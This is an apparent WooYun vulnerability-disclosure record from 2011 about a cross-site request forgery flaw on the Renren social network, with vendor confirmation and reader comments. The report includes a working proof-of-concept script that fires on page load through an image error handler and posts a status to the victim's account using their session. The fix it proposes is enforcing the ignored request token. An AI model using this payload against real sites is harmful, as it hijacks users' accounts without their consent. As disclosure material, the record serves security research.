{"id": 21882, "wybug_id": "wooyun-2011-03105", "wybug_title": "人人网csrf", "wybug_corp": "人人网", "wybug_author": "androidhacker", "wybug_date": "2011-10-24 21:53", "wybug_open_date": "2011-11-23 21:53", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "防护策略绕过", "逻辑错误前台限制绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-10-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-10-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-11-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-11-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-11-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-11-23：\t细节向公众公开  简要描述： 第三波了，能不能给个小礼物呢:-) 详细说明：  把UID替换即可\n<script>function createXHR(){\treturn window.XMLHttpRequest?\tnew XMLHttpRequest():\tnew ActiveXObject(\"Microsoft.XMLHTTP\");}function post(url,data,sync){\txmlHttp = createXHR();    xmlHttp.open(\"POST\",url,sync);    xmlHttp.setRequestHeader(\"Accept\",\"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\");    xmlHttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded; charset=UTF-8\");    xmlHttp.withCredentials = \"true\";    xmlHttp.send(data);}function publish(){\turl = 'http://shell.renren.com/UID/status';\tdata = 'content=%u6C42%u79CD%u5B50%uFF01&isAtHome=1&channel=renren';\tpost(url,data,true);}function main(){\ttry{\t\tpublish();\t}\tcatch(e)\t{\t    alert(e);\t}\t}</script><img src=\"#\" onerror=\"main()\" width=\"1\" height=\"1\" border=\"0\">\n   漏洞证明：  表单中存在一个requestToken但奇怪的是requestToken没有任何作用   修复方案：  requestToken生效就可以了   版权声明：转载请注明来源 androidhacker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2011-10-26 18:43 厂商回复： 3q 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-10-24 21:58 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  给人人妹子都可以了    \n     2011-10-24 22:10 |    \t\tandroidhacker \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:10        | 这个人很懒，什么都没留下)\t\t \n  好啊好啊，求妹子    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}